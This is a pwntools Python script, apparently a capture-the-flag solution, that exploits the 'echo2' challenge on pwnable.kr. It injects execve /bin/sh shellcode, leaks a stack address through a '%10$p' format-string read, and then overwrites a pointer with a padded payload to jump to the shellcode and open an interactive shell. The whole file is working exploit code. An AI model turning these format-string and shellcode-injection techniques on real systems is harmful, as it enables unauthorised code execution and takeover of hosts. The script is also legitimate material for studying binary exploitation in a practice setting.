from pwn import *

# p = process('./echo2')
p = remote('pwnable.kr', '9011')

shellcode = '\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05'
p.sendlineafter(': ', shellcode)
p.sendlineafter('>', '2')
p.recvuntil(shellcode + '\n')
p.sendline('%10$p')
ebp = int(p.recvline(), 16)
success('ebp = 0x%x', ebp)
sc = ebp - 0x20
p.sendlineafter('>', '4')
p.sendlineafter('(y/n)', 'n')
p.sendlineafter('>', '3')
payload = b'a' * 24 + p64(sc)
p.sendline(payload)
p.recvuntil('>')

p.interactive()